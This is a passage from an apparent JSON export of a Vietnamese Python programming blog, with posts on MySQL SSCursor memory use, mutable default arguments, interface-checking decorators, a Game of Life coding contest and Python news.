Hết bộ nhớ Vấn đề Một câu truy vấn có thể trả về một lượng dữ liệu khổng lồ. Ví dụ câu truy vấn SELECT * FROM users có thể trả về hơn chục triệu bản ghi ở các ứng dụng lớn. Trong điều kiện bình thường, có lẽ lượng bản ghi lớn như vậy sẽ khiến cho chương trình của chúng ta sử dụng hết bộ nhớ và bị buộc phải chấm dứt giữa chừng, cho dù chúng ta có sử dụng fetchone , fetchmany hay fetchall để lấy dữ liệu. Lý do là phần giao tiếp giữa Python và MySQL mặc định sẽ lấy tất cả các bản ghi của câu truy vấn về trước, chứa chúng trong bộ nhớ, rồi sau đó trả về cho Python một bản ghi, nhiều bản ghi, hay tất cả các bản ghi đó tùy thuộc vào hàm nào được gọi. Điều này cũng dễ hiểu vì giao thức mạng của MySQL là mô hình yêu cầu/đáp trả (request/response). Một truy vấn là một yêu cầu. Và các bản ghi của truy vấn đó là một đáp trả. Cho nên trình điều khiển (driver) cần phải đọc hết toàn bộ đáp trả để kết thúc chu trình yêu cầu/đáp trả trước khi trả lời các lời gọi hàm fetchone , fetchmany hay fetchall . Nói một cách khác, các hàm fetchone hay fetchmany trả về kết quả đã có trong bộ nhớ. Đó cũng chính là lý do vì sao chúng ta có thể gọi fetchone hay fetchmany nhiều lần. Các hàm này không tạo một chu trình yêu cầu/đáp trả mới mà chỉ đơn giản là tiếp tục trả về các bản ghi đã chứa trong bộ nhớ. Cách khắc phục Cách khắc phục là sử dụng SSCursor khi tạo con trỏ từ kết nối MySQL. Lớp SSCursor nằm trong mô-đun MySQLdb . conn = MySQLdb . connect ( ... ) cursor = MySQLdb . SSCursor ( conn ) Sau đó khi gọi fetchone hoặc fetchmany thì trình điều khiển sẽ không đọc toàn bộ đáp trả vào bộ nhớ nữa mà sẽ chỉ đọc vừa đủ để trả về bấy nhiêu bản ghi cho ta. Lưu ý Khi sử dụng SSCursor , ta nhất định phải đảm bảo chu trình yêu cầu/đáp trả được hoàn tất. Ví dụ câu truy vấn trả về 10 bản ghi, thì ta phải đảm bảo đọc hết 10 bản ghi này. Nếu ta chỉ gọi fetchone 5 lần, thì sẽ còn 5 bản ghi vẫn chưa được đọc hết, và do đó ta sẽ không thể gửi truy vấn khác trong cùng kết nối hiện tại. Vì SSCursor không giữ kết quả trong bộ nhớ nên ta sẽ không thể di chuyển con trỏ tới, hoặc lùi để truy xuất bản ghi ta cần. Điều duy nhất chúng ta có thể làm với SSCursor là đọc tuần tự tất cả các bản ghi. Hết giờ (timeout) Vấn đề Với SSCursor ta có thể sẽ viết mã như sau: row = cursor . fetchone () while row : # xử lý row row = cursor . fetchone () Đoạn mã này đôi khi sẽ gây ra lỗi 2013 (Lost connection to MySQL server during query). Lý do là việc xử lý từng bản ghi sẽ làm ta tốn thời gian, và ta sẽ không thể đọc đáp trả đủ nhanh, khiến cho máy chủ MySQL phải hoãn việc gửi tiếp các bản ghi về cho ta. Máy chủ MySQL chỉ có thể hoãn việc gửi thông tin trong một thời gian ngắn. Quá thời gian này, máy chủ sẽ tự ngắt kết nối. Cách khắc phục Tốt nhất là chúng ta sử dụng SSCursor để đọc tất cả các bản ghi từ máy chủ ở xa và ghi chúng vào một tập tin trên máy hiện tại. Sau đó ta đọc lại từ tập tin này và xử lý từng bản ghi đã lưu. Khi làm như vậy, chúng ta tránh được lỗi hết bộ nhớ đã đề cập ở trên, và hy vọng rằng việc ghi bản tin ra dĩa xảy ra đủ nhanh để ta có thể đọc bản ghi khác gần như ngay lập tức, tránh được lỗi hết giờ. Lưu ý Với việc ghi bản tin ra dĩa (hoặc một nơi nội bộ nào khác), chúng ta cần đảm bảo rằng nơi đó có đủ chỗ để lưu toàn bộ các bản ghi đọc được.","tags":"Bài viết","title":"Truy vấn triệu bản ghi với MySQL"},{"url":"2012/07/tham-so-tu-dong.html","text":"Tham số mặc định Python cho phép chúng ta khai báo hàm với tham số mặc định như sau: def function ( arg_1 , arg_2 = {}): arg_2 [ arg_1 ] = True print ( arg_2 ) Với khai báo hàm trên, tham số arg_2* trở thành một tham số mặc định và sẽ nhận giá trị là một từ điển rỗng. Khi gọi hàm function , chúng ta có thể không cung cấp giá trị cho tham số arg_2 . Ví dụ khi thực hiện lệnh gọi sau, trên màn hình sẽ xuất hiện chuỗi {1: True} : function ( 1 ) # in ra '{1: True}' Nếu tiếp tục gọi một lần tương tự, chúng ta nhận được một kết quả ngoài mong đợi. function ( 2 ) # in ra '{1: True, 2: True}' Lần này, thay vì chỉ in ra từ điển với một khóa {2: True} , ta nhận được cả hai giá trị. Ý nghĩa của tham số mặc định Lý giải điều này không khó. Trong mục 4.7.1 của Bài chỉ dẫn Python có nêu: Giá trị mặc định được định giá tại nơi hàm được định nghĩa. Điều này dẫn đến hệ quả là: Giá trị mặc định chỉ được định giá một lần. Điểm này quan trọng khi *giá trị* mặc định là một giá trị khả biến như danh sách, từ điển hoặc các đối tượng của hầu hết mọi lớp. Do đó, với ví dụ của hàm function ở trên, tham số arg_2 sẽ nhận giá trị mặc định là từ điển được tạo ra ngay khi dòng lệnh def function(...) được dịch và thực thi. Trong các lần gọi lệnh function sau đó, nếu không xác định tham số cho arg_2 , thì arg_2 sẽ chỉ đến cùng một từ điển này. Và vì thế mọi tác động đến arg_2 đều tác động đến cùng một đối tượng từ điển. Thông thường, cách giải quyết vấn đề này sẽ bao gồm: Xác định giá trị mặc định là None ở câu lệnh def Khởi tạo giá trị mặc định mới và gán nó vào biến ở trong thân hàm nếu giá trị hiện tại là None Hàm function sẽ được sửa lại như sau: def function ( arg_1 , arg_2 = None ): if arg_2 is None : # kiểm tra arg_2 có phải None không arg_2 = {} # gán đối tượng từ điển mới vào arg_2 arg_2 [ arg_1 ] = True print ( arg_2 ) Mô-đun auto_argument Để đơn giản hóa và tránh lập đi lập lại dòng lệnh if , tôi đã phát triển một thư viện nhỏ đặt tên là auto_argument (thông số tự động). Với thư viện này, chúng ta có thể viết lại hàm function như sau: @callable_auto_argument ([( 'arg_2' , None , dict )]) def function ( arg_1 , arg_2 = None ): arg_2 [ arg_1 ] = True print ( arg_2 ) Điểm khác biệt chính là ở việc sử dụng bộ trang hoàng callable_auto_argument để tự động thay thế tham số arg_2 với giá trị trả về từ lệnh gọi dict() . Bộ trang hoàng auto_argument (lớp cha của callable_auto_argument ) nhận một dãy các bộ 3 (tên tham số, giá trị dấu, giá trị thay thế) (argument name, marker, value). Khi tham số có giá trị là giá trị dấu thì giá trị của tham số sẽ được thay bằng giá trị tạo ra từ giá trị thay thế . callable_auto_argument tạo ra giá trị thay thế bằng cách gọi hàm giá trị thay thế. Người dùng cũng có thể tạo lớp con của các bộ trang hoàng này để tùy chỉnh giá trị thay thế riêng hoặc tránh phải lập lại giá trị dấu. Xem qua hàm test_subclass và lớp auto_dict_argument trong mã nguồn. Mã nguồn của các bộ trang hoàng này được liệt kê ở ngay dưới. Mã nguồn này được cung cấp theo điều khoản bản quyền MIT . Người dùng có thể tùy ý sử dụng, hay sửa đổi mã nguồn cho hợp với nhu cầu. '''Automatically replace a default argument with some other (potentially dynamic) value. The default argument is usually guarded like this:: def func(arg=None): if arg is None: arg = dict() // use arg With decorators provided in this module, one can write:: __marker = object() @callable_auto_argument([('arg', __marker, dict)]) def func(arg=__marker): // use arg See class:`callable_auto_argument`. Also, the standard Python behavior could be thought as:: __marker = object() @passthru_auto_argument([('arg', __marker, {})]) def func(arg=__marker): // ... See class:`passthru_auto_argument`. These classes can be used by themselves or serve as base classes for more customizations. For example, to eliminate repeated typings, one can subclass ``callable_auto_argument`` like this:: class auto_dict_argument(callable_auto_argument): def __init__(self, *names): names_markers_values = [] for name in names: names_markers_values.append((name, None, dict)) super(auto_dict_argument, self).__init__(names_markers_values) And then apply this on methods like this:: @auto_dict_argument('arg_1', 'arg_2', 'arg_3') def method(arg_1=None, arg_2=None, arg_3=None): # arg_1, arg_2, arg_3 are new dicts unless specified otherwise # and these lines are no longer required # if arg_1 is None: arg_1 = {} # if arg_2 is None: arg_2 = {} # if arg_3 is None: arg_3 = {} ''' import unittest class auto_argument ( object ): '''The base class for automatic argument. Subclasses must implement method:`create` to create appropriate value for the argument. ''' def __init__ ( self , names_markers_values ): '''Construct an auto argument decorator with a collection of variable names, their markers, and their supposed values. The __supposed__ value objects are used in method:`create` to produce final value. Args: names_markers_values (collection of 3-tuples): A collection of (string, object, object) tuples specifying (in that order) the names, the marker objects, and the supposed value objects ''' self . names_markers_values = names_markers_values def create ( self , name , current_value , value ): '''Return a value based for the named argument and its current value. This final value will be used to replace what is currently passed in the invocation. Subclasses MUST override this method to provide more meaningful behavior. Args: name (string): The argument's name current_value: Its current value in this invocation value: The supposed value passed in during construction time Returns: Final value for this argument ''' raise NotImplementedError () def __call__ ( self , orig_func ): def new_func ( * args , ** kw_args ): for name , marker , value in self . names_markers_values : # check kw_args first try : if kw_args [ name ] is marker : kw_args [ name ] = self . create ( name , kw_args [ name ], value ) except KeyError : # ignored pass else : continue # then check args # we need to instropect the arg names from orig_func co_obj = orig_func . func_code # number of required arguments nr_required = ( co_obj . co_argcount - len ( orig_func . func_defaults )) for i in range ( nr_required , co_obj . co_argcount ): if co_obj . co_varnames [ i ] != name : continue # is it supplied in args? if i < len ( args ): if args [ i ] is marker : if isinstance ( args , tuple ): args = list ( args ) args [ i ] = self . create ( name , args [ i ], value ) # it is not, so, check defaults else : default = orig_func . func_defaults [ i - nr_required ] if default is marker : kw_args [ name ] = self . create ( name , default , value ) # invoke orig_func with new args return orig_func ( * args , ** kw_args ) return new_func class callable_auto_argument ( auto_argument ): def create ( self , name , current_value , value ): # call on value return value () class passthru_auto_argument ( auto_argument ): def create ( self , name , current_value , value ): # just return it directly return value class AutoArgumentTest ( unittest . TestCase ): def test_keyword_1 ( self ): marker = 'replace_me' @passthru_auto_argument ([( 'arg_name' , marker , 'done' )]) def orig_func_0 ( arg_name = marker ): return arg_name self . assertEqual ( 'done' , orig_func_0 ()) self . assertEqual ( 'done' , orig_func_0 ( marker )) self . assertEqual ( 'not_replace' , orig_func_0 ( 'not_replace' )) self . assertEqual ( 'done' , orig_func_0 ( arg_name = marker )) self . assertEqual ( 'not_replace' , orig_func_0 ( arg_name = 'not_replace' )) @passthru_auto_argument ([( 'arg_name' , 'replace_me' , 'done' )]) def orig_func_1 ( junk , arg_name = 'replace_me' ): return junk , arg_name self . assertEqual (( 'ignore' , 'done' ), orig_func_1 ( 'ignore' )) self . assertEqual (( 'ignore' , 'done' ), orig_func_1 ( 'ignore' , marker )) self . assertEqual (( 'ignore' , 'not_replace' ), orig_func_1 ( 'ignore' , 'not_replace' )) self . assertEqual (( 'ignore' , 'done' ), orig_func_1 ( 'ignore' , arg_name = marker )) self . assertEqual (( 'ignore' , 'not_replace' ), orig_func_1 ( 'ignore' , arg_name = 'not_replace' )) def test_keyword_2 ( self ): marker_1 = 'replace_me' marker_2 = 'replace_too' @passthru_auto_argument ([( 'arg_1' , marker_1 , 'done' ), ( 'arg_2' , marker_2 , 'enod' )]) def orig_func_0 ( arg_1 = marker_1 , arg_2 = marker_2 ): return arg_1 , arg_2 self . assertEqual (( 'done' , 'enod' ), orig_func_0 ()) self . assertEqual (( 'not_replace' , 'enod' ), orig_func_0 ( 'not_replace' )) self . assertEqual (( 'done' , 'not' ), orig_func_0 ( marker_1 , 'not' )) self . assertEqual (( 'done' , 'enod' ), orig_func_0 ( marker_1 , marker_2 )) self . assertEqual (( 'not_1' , 'not_2' ), orig_func_0 ( 'not_1' , 'not_2' )) @passthru_auto_argument ([( 'arg_1' , marker_1 , 'done' ), ( 'arg_2' , marker_2 , 'enod' )]) def orig_func_1 ( junk , arg_1 = marker_1 , arg_2 = marker_2 ): return junk , arg_1 , arg_2 self . assertEqual (( '.' , 'done' , 'enod' ), orig_func_1 ( '.' )) self . assertEqual (( '.' , 'not_replace' , 'enod' ), orig_func_1 ( '.' , 'not_replace' )) self . assertEqual (( '.' , 'done' , 'not' ), orig_func_1 ( '.' , marker_1 , 'not' )) self . assertEqual (( '.' , 'done' , 'enod' ), orig_func_1 ( '.' , marker_1 , marker_2 )) self . assertEqual (( '.' , 'not_1' , 'not_2' ), orig_func_1 ( '.' , 'not_1' , 'not_2' )) def test_subclass ( self ): class auto_dict_argument ( callable_auto_argument ): def __init__ ( self , * names ): names_markers_values = [] for name in names : names_markers_values . append (( name , None , dict )) super ( auto_dict_argument , self ) . __init__ ( names_markers_values ) @auto_dict_argument ( 'arg_1' , 'arg_2' ) def test_func ( arg_1 = None , arg_2 = None ): arg_1 [ '1' ] = 'arg_1' arg_2 [ '2' ] = 'arg_2' return ( arg_1 , arg_2 ) self . assertEqual (({ '1' : 'arg_1' }, { '2' : 'arg_2' }), test_func ()) arg_1 , arg_2 = test_func () self . assertNotEqual ( id ( arg_1 ), id ( arg_2 )) if __name__ == '__main__' : unittest . main ()","tags":"Bài viết","title":"Tham số tự động"},{"url":"2012/07/lap-trinh-giao-dien-trong-python.html","text":"Bài viết này bàn về hướng lập trình giao diện (programming to the interface) thay vì giao diện người dùng, hay giao diện đồ họa (user interface, graphical interface). Lập trình giao diện Lập trình giao diện (giao tiếp) là một trong hai nguyên tắc cơ bản được nhắc đến trong quyển sách kinh điển Design Patterns . Lập trình giao diện đặt trọng tâm vào việc tạo ra một hợp đồng (contract) chắc chắn giữa hai bên người dùng (consumer) và người cung cấp (producer): Người dùng là bên sử dụng các lớp, hàm, hoặc mã mà người cung cấp tạo ra Người cung cấp là bên tạo ra thư viện mã Hợp đồng là các kiến thức chung mà cả người dùng và người cung cấp đều hiểu và tuân theo Hợp đồng xác định các lớp cơ bản, và các phương thức của các lớp đó. Vì đây là hợp đồng được cả hai bên tuân theo nên ý nghĩa của các lớp, cũng như cách hoạt động của các phương thức phải được định nghĩa một cách tường minh và chuẩn xác. Người dùng sẽ dựa theo hợp đồng này và sử dụng các lớp trong đó cho mục đích riêng của họ, trong khi người cung cấp có thể thay đổi cách hiện thực hợp đồng một cách khả chuyển miễn sao vẫn đảm bảo được yêu cầu của hợp đồng. Ví dụ: hợp đồng nêu ra là hàm func nhận vào một số nguyên, và trả về tổng của số nguyên đó với 2. Hợp đồng này rõ ràng ví nó xác định tên hàm ( func ), giá trị đầu vào ( một số nguyên ) và giá trị đầu ra ( tổng của số nguyên nhập vào với 2 ). Người sử dụng, khi cần tính tổng của 5 và 2, có thể gọi func(5) . Người cung cấp có thể cài đặt def func(i): return i + 2 hoặc func = lambda i: i + 2 hoặc một cách nào khác miễn sao phù hợp với câu chữ của hợp đồng. Theo quan điểm này, người sử dụng và người cung cấp giao tiếp với nhau thông qua một môi trường chung, một giao diện chung. Người sử dụng dựa trên giao diện này để yêu cầu dịch vụ từ người cung cấp. Còn người cung cấp dựa trên giao diện này để đáp ứng đúng yêu cầu người sử dụng. Đối với các ngôn ngữ lập trình hướng đối tượng, chúng ta hay gặp các thuật ngữ như giao diện ( interface ), lớp trừu tượng ( abstract class ) và lớp cụ thể ( concrete class ). Giao diện mang tính chất của một hợp đồng, hoàn toàn không có bất kỳ một hiện thực cụ thể nào. Lớp cụ thể là một hiện thực đầy đủ của một giao diện. Và lớp trừu tượng là một hiện thực chưa đầy đủ của một giao diện. Lập trình giao diện trong Python Python không có sự phân biệt giữa ba khái niệm này. Tuy nhiên, trong thực tế, chúng ta hay viết mã tương tự như sau để mô phỏng một giao diện. class Interface ( object ): def method_1 ( self ): raise NotImplementedError () def method_2 ( self ): raise NotImplementedError () Các phương thức trong lớp Interface chỉ có một câu lệnh duy nhất là raise NotImplementedError() để cố tình gây ra biệt lệ khi chúng được gọi. Một lớp trừu tượng có thể được mô phỏng như sau: class AbstractClass ( Interface ): def method_1 ( self ): # làm một việc gì đó pass Lớp AbstractClass là lớp con của Interface và hiện thực hóa phương thức method_1 nhưng vẫn để phương thức method_2 lơ lửng. Cuối cùng, một lớp cụ thể là một lớp con của Interface hoặc AbstractClass nhưng hiện thực hóa tất cả các phương thức. class ConcreteClass ( AbstractClass ): def method_2 ( self ): # làm một việc gì đó pass Điểm đáng lưu ý là tất cả các lớp này đều hợp lệ trong Python. Chúng ta hoàn toàn có thể khởi tạo một đối tượng của một trong ba lớp này và chỉ đến khi gọi một hàm nào đó thì biệt lệ mới xảy ra. Nói cách khác, biệt lệ NotImplementedError chỉ được phát hiện khi chạy, trong khi đáng lẽ nó đã phải được phát hiện ngay khi dịch. Điều này làm mất giá trị của một hợp đồng, và hạn chế việc áp dụng hướng lập trình giao diện trong Python. Để khắc phục điểm yếu này, tôi đã viết một bộ trang hoàng (decorator) nhỏ để bắt lỗi ngay khi một lớp cụ thể được định nghĩa thiếu. Định nghĩa thiếu ở đây mang ý nghĩa rằng lớp cụ thể đã quên định nghĩa một phương thức nào đó. '''Set of (class) decorators to help with interface programming. Examples:: @concrete class subclass(parent): ... Released to the public domain. Nam T. Nguyen, 2012 ''' import dis import types import unittest def concrete ( orig_class ): '''A decorator to ensure that a concrete class has no un-implemented methods. An un-implemented method is defined similarly to:: def method(...): raise NotImplementedError() This, when translated to bytecode, looks like:: LOAD_GLOBAL 0 (NotImplementedError) CALL_FUNCTION 1 RAISE_VARARGS 1 ... Or when ``raise NotImplementedError``:: LOAD_GLOBAL 0 (NotImplementedError) RAISE_VARARGS 1 ... The check here is for such pattern. ''' for name in dir ( orig_class ): func = getattr ( orig_class , name ) # correct type? if type ( func ) not in ( types . FunctionType , types . MethodType ): continue # check if first name is NotImplementedError if len ( func . func_code . co_names ) < 1 or \\ func . func_code . co_names [ 0 ] != 'NotImplementedError' : continue # and RAISE_VARARGS somewhere after that for position in ( 3 , 6 ): if len ( func . func_code . co_code ) < position : continue opcode = ord ( func . func_code . co_code [ position ]) if dis . opname [ opcode ] == 'RAISE_VARARGS' : raise SyntaxError ( 'Function %s . %s must be implemented.' % ( orig_class . __name__ , func . func_name )) return orig_class class ConcreteTest ( unittest . TestCase ): def test_raise ( self ): class test1 : def method ( self ): raise NotImplementedError self . assertRaises ( SyntaxError , concrete , test1 ) class test2 : def method ( self ): raise NotImplementedError () self . assertRaises ( SyntaxError , concrete , test2 ) def test_not_raise ( self ): class test : def method ( self ): return NotImplementedError () concrete ( test ) def test_subclass ( self ): class parent ( object ): def override_me ( self ): raise NotImplementedError () class test ( parent ): def leave_it ( self ): pass self . assertRaises ( SyntaxError , concrete , test ) if __name__ == '__main__' : unittest . main () Để sử dụng bộ trang hoàng concrete này, ta sẽ sửa lại lớp ConcreteClass như sau: @concrete class ConcreteClass ( AbstractClass ): # như trên Nếu ConcreteClass quên hiện thực hóa một phương thức nào đó, Python sẽ thông báo SyntaxError ngay sau khi ConcreteClass được định nghĩa. Tóm tắt Lập trình giao diện giúp chúng ta tách biệt hai yếu tố là cái gì, và như thế nào. Người sử dụng quan tâm nhiều đến câu hỏi cái gì được thực hiện hơn là làm sao để thực hiện chúng. Trong khi người cung cấp có thể dễ dàng thay đổi cách thực hiện miễn sao vẫn đảm bảo câu chữ của hợp đồng. Python không có sẵn cơ chế giao diện và lớp trừu tượng như các ngôn ngữ lập trình khác. Chúng ta phải sử dụng bộ trang hoàng concrete để bắt lỗi định nghĩa thiếu. Hy vọng bài viết ngắn này sẽ đem lại cho bạn đọc một mẹo lập trình giao diện hữu ích trong Python.","tags":"Bài viết","title":"Lập trình giao diện trong Python"},{"url":"2011/12/python-ngon-ngu-lap-trinh-tot-nhat.html","text":"Tạp chí Linux Journal đã công bố kết quả khảo sát người đọc hàng năm của mình vào ngày 01 tháng 12 vừa qua. Theo đánh giá này, Python lại một lần nữa trong suốt ba năm liên tục được người đọc đánh giá là ngôn ngữ lập trình tốt nhất . Thông tin chi tiết có thể được xem thêm từ nguồn Linux Journal .","tags":"Tin tức","title":"Python - Ngôn Ngữ Lập Trình Tốt Nhất"},{"url":"2011/10/cau-chuyen-toi-uu-hoa-doan-ma-python.html","text":"Trên trang blog của Dropbox ngày hôm qua có chia sẻ kinh nghiệm của họ trong việc tối ưu hóa một đoạn mã Python ngắn. http://tech.dropbox.com/?p=89 Kết luận của họ là: Các kỹ thuật căn bản như inline hàm (inline function), tự lặp (implicit loop), tận dụng mã C đều đúng. Cấu trúc set và dict trong Python rất nhanh. Việc sử dụng biến nội bộ thay cho toàn cục mặc dù có ích, nhưng không nhiều. Ghép chuỗi (string concatenation) nhanh hơn nhiều so với định dạng chuỗi (string interpolation). Đây là một bài chia sẻ rất hay.","tags":"Tin tức","title":"Câu chuyện tối ưu hóa đoạn mã Python"},{"url":"2011/10/hinh-anh-tai-software-freedom-day-2010.html","text":"Hôm nay tự nhiên thấy trên máy có mấy tấm hình cũ ở Ngày Phần Mềm Tự Do 2010 vẫn chưa được đăng. Năm 2010, thành viên Phan Đắc Anh Huy đã trình bày về phần mềm Vithon Forum (chính là phần mềm được sử dụng để làm Diễn đàn của nhóm PCNV). Sau đây là các tấm hình chụp hôm đó. http://img36.imageshack.us/i/img20100918104740.jpg/ http://img37.imageshack.us/i/img20100918104748.jpg/ http://img97.imageshack.us/i/img20100918104833.jpg/ Điều kiện ánh sáng tuy không được tốt nhưng cũng phần nào thể hiện được cái đầu du côn và thân hình phì lũ của Huy.","tags":"Tin tức","title":"Hình ảnh tại Software Freedom Day 2010"},{"url":"2011/10/ket-qua-cuoc-thi-doi.html","text":"Cuộc thi Đời kết thúc vào tuần trước nhưng vì không có điều kiện truy cập Internet nên đến bây giờ ban tổ chức mới có thể công bố kết quả. Cuộc thi thu hút bốn bài tham dự từ các bạn sau: Tác giả Bài tham dự Nhâm Xuân Nam life.py Huỳnh Hải Âu bilife.py Phan Phụng Tiến treeoflife.py Vũ Khuê cuocthidoi.py Nhóm PCNV đã sử dụng một chương trình chấm giải đơn giản khác để đánh giá các bài này. Chương trình này chỉ đơn giản là tạo một ma trận MxN phần tử và yêu cầu các bài tham gia tính giá trị của các ô ngẫu nhiên tại một thế hệ trong tương lai. Ở vòng đầu tiên, ma trận 1x1 được sử dụng: G:\\vithon\\life>judge.py -c 1 -r 1 -n 10000 bilife.Board life.MainBoard treeoflife.Board cuocthidoi.Board Generating random test case Width = 1 Height = 1 0 Executing bilife.Board Executing life.MainBoard Executing treeoflife.Board Executing cuocthidoi.Board Checking for cell (0, 0) Traceback (most recent call last): File \"G:\\vithon\\life\\judge.py\", line 120, in <module> main() File \"G:\\vithon\\life\\judge.py\", line 96, in main if results[module_name]['object'].get_cell(row, col): File \"G:\\vithon\\life\\treeoflife.py\", line 160, in get_cell raise ValueError() ValueError Vì sinh ra lỗi nên mô-đun treeoflife đã bị loại. Ở vòng hai, ma trận 2x2 được sử dụng và chỉ tính một thế hệ tương lai: G:\\vithon\\life>judge.py -c 2 -r 2 -n 1 bilife.Board life.MainBoard cuocthidoi.Board Generating random test case Width = 2 Height = 2 1 1 0 1 Executing bilife.Board Executing life.MainBoard Executing cuocthidoi.Board Checking for cell (0, 1) *** alive count = 2, dead_count = 1 bilife is eliminated Checking for cell (1, 0) *** alive count = 3, dead_count = 0 Checking for cell (0, 0) *** alive count = 2, dead_count = 1 bilife is eliminated Checking for cell (1, 1) *** alive count = 2, dead_count = 1 bilife is eliminated RESULT: [+] cuocthidoi : 0.000000 seconds [+] life : 0.000000 seconds [-] bilife : 0.000000 seconds Với lần chạy này, chỉ có mô-đun bilife đưa ra kết quả sai cho trường hợp ô (0, 1) . Chương trình chấm so sánh kết quả của mô-đun với kết quả của số đông . Trong trường hợp này, số đông đã đúng. Sau hai lần chạy, chỉ còn lại hai mô-đun life và cuocthidoi . Lần chạy thứ ba sử dụng ma trận 2x2 với một thế hệ: G:\\vithon\\life>judge.py -c 2 -r 2 -n 1 life.MainBoard cuocthidoi.Board Generating random test case Width = 2 Height = 2 1 0 0 0 Executing life.MainBoard Executing cuocthidoi.Board Checking for cell (0, 0) *** alive count = 1, dead_count = 1 life is eliminated Checking for cell (1, 1) *** alive count = 0, dead_count = 2 Checking for cell (1, 0) *** alive count = 0, dead_count = 2 Checking for cell (1, 0) *** alive count = 0, dead_count = 2 RESULT: [-] life : 0.000000 seconds [+] cuocthidoi : 0.000000 seconds Với lần chạy này, life đã bị loại, và chỉ còn cuocthidoi . Tóm lại, sau ba vòng chạy thì chỉ có mô-đun cuocthidoi đưa ra đáp án đúng. Tuy nhiên, giải này không có người chiến thắng vì mục tiêu của giải là thi về tốc độ thực thi. Khi chỉ có một đối thủ trong cuộc thi thì giải trở nên vô nghĩa. Hơn nữa, bài tham dự cuocthidoi.py đã không thực hiện đúng quy chế thứ 3 trong thể lệ tham gia nên cũng bị loại. Mặc dù không có người chiến thắng nhưng nhóm PCNV xin chúc mừng tác giả Vũ Khuê đã vượt qua các đối thủ khác trong cuộc thi. Nói tóm lại, giải đã không đạt được mục tiêu đề ra ban đầu. Xin hẹn gặp các bạn ở các giải sau!","tags":"Tin tức","title":"Kết quả cuộc thi Đời"},{"url":"2011/09/cuoc-thi-doi.html","text":"Nhóm PCNV hân hạnh tổ chức một cuộc thi nhỏ với giải thưởng lớn! Game of Life, tạm dịch Trò chơi Đời, là một mô phỏng trạng thái các điểm trên một ma trận MxN đơn giản. Các điểm trên ma trận có trạng thái hoặc là sống, hoặc là chết. Trạng thái của một ma trận được gọi là một thế hệ. Các điểm trên ma trận ở thế hệ G sẽ tuân theo các luật sau để xác định trạng thái của chúng ở thế hệ G + 1 : Nếu số lượng các điểm sống chung quanh điểm hiện tại là 3, thì điểm hiện tại sẽ sống. Nếu số lượng các điểm sống chung quanh điểm hiện tại là 2, thì điểm hiện tại sẽ tiếp tục giữ trạng thái hiện tại. Nếu số lượng các điểm sống chung quanh điểm hiện tại nhỏ hơn 2, hoặc lớn hơn 3, điểm hiện tại sẽ chết. Cuộc thi Đời là sự tranh đua của các mã nguồn Python thực hiện việc tối ưu hóa cách thể hiện mô phỏng trên. Thể lệ của cuộc thi bao gồm: Bài tham dự gửi về địa chỉ thư admin tại vithon.org. Bài tham dự chỉ được sử dụng ngôn ngữ Python, và các thư viện chuẩn đi kèm. Bài tham dự chỉ cần hiện thực hóa lớp mẫu bên dưới bằng cách kế thừa nó và cài đặt các phương thức cần thiết. Yếu tố cơ bản để đánh giá là tốc độ chạy của chương trình. Hạn tham dự là hết ngày 15 tháng 10 năm 2011. Chỉ có một giải có trị giá tương đương 250 đô la Singapore . Quyết định của ban tổ chức là cuối cùng, xin không nhận khiếu nại. class Board ( object ): '''Represents the Game of Life matrix. Each cell has at most 8 neighbors. A cell may have less than 8 neighbors. For example, a cell at (0, 0) would have only three neightbors (0, 1), (1, 0) and (1, 1). The cells are addressed in a row-major (row first) manner. The index starts from zero. ''' def __init__ ( self , width = 10 , height = 10 ): '''Initializes this board. Args: width (int): Number of cells in a row. height (int): Number of rows in this board. ''' raise NotImplemented () def generation ( self , n = 1 ): '''Transform this board into next ``n`` generation(s). The transformation is in place similar to ``list.sort``. No value is returned to the caller. Args: n (int): Number of generations. Raises: ValueError: If n is smaller than 1. ''' raise NotImplemented () def get_cell ( self , row , col ): '''Returns the state of the cell at row ``row`` and column ``col``. Args: row (int): The row, zero-indexed. col (int): The column, zero-indexed. Returns: True: If the cell is alive. False: If the cell is dead. ''' raise NotImplemented () def set_cell ( self , row , col , state ): '''Sets a cell at row ``row`` and column ``col`` to state ``state``. Args: row (int): The row, zero-indexed. col (int): The column, zero-indexed. state (bool): Cell's state. ''' raise NotImplemented () def get_row ( self , row ): '''Returns the states of all cells in row ``row``. Args: row (int): The row, zero-indexed. Returns: A sequence of bools. ''' raise NotImplemented () Mọi thắc mắc và thảo luận xin vui lòng gửi lên diễn đàn .","tags":"Tin tức","title":"Cuộc thi Đời"},{"url":"2011/09/python-322-ra-doi.html","text":"Khoảng 10 tiếng trước, Georg Brandl đã gửi một bức thư điện tử lên hộp thư chung python-dev để công bố sự ra đời của phiên bản Python 3.2.2. Python 3.2.2 về cơ bản là phiên bản sửa lỗi, đặc biệt là lỗi trong mô-đun urllib.request xảy ra trong 3.2.1. Phiên bản 3.2.2 có thể được tải về từ địa chỉ http://www.python.org/download/releases/3.2.2/ .","tags":"Tin tức","title":"Python 3.2.2 ra đời"},{"url":"2011/08/python-tools-cho-visual-studio.html","text":"Ngày 29 tháng 08 vừa qua, Microsoft đã tung ra phiên bản đầu tiên của phần mềm miễn phí, nguồn mở Python Tools dành cho Visual Studio. Với công cụ này, người dùng sẽ sử dụng giao diện quen thuộc của Visual Studio để viết mã theo ngôn ngữ Python. Một số tính năng chính bao gồm trình soạn thảo, quản lý dự án, trình gỡ rối, hỗ trợ Intellisense và Refactoring, hỗ trợ IronPython lẫn CPython. Ngoài ra, nếu sử dụng Visual Studio phiên bản Ultimate, người dùng sẽ có thêm cả trình Profiler. Công cụ Python Tools cho Visual Studio cần phiên bản Visual Studio Shell miễn phí, hoặc Visual Studio phiên bản Pro trở lên. Công cụ này không sử dụng chung với Visual Studio Express được.","tags":"Tin tức","title":"Python Tools cho Visual Studio"},{"url":"2011/08/lap-lich-goi-ham-voi-gevent.html","text":"Đôi khi chúng ta cần một cách gì đó để lập lịch gọi hàm tương tự như công cụ cron trong các hệ Unix. Nếu chúng ta may mắn đang làm việc với Gevent sẵn rồi thì hai dòng sau là một cách đơn giản để lập lịch. def schedule ( delay , func , * args , ** kw_args ): gevent . spawn_later ( 0 , func , * args , ** kw_args ) gevent . spawn_later ( delay , schedule , delay , func , * args , ** kw_args ) Ý tưởng đằng sau hai dòng lệnh này là chúng ta tận dụng sẵn vòng lặp sự kiện (event loop) của Gevent để cài hàm cần được thực thi vào. Do đó, chúng ta sẽ đỡ được việc sử dụng vòng lặp với sleep . Dòng thứ hai có tác dụng như một lệnh gọi đệ quy đuôi (tail recursion), nhưng không tốn bộ nhớ ngăn xếp (stack memory). Trong trường hợp chúng ta không sử dụng Gevent thì gói apscheduler là một lựa chọn đáng 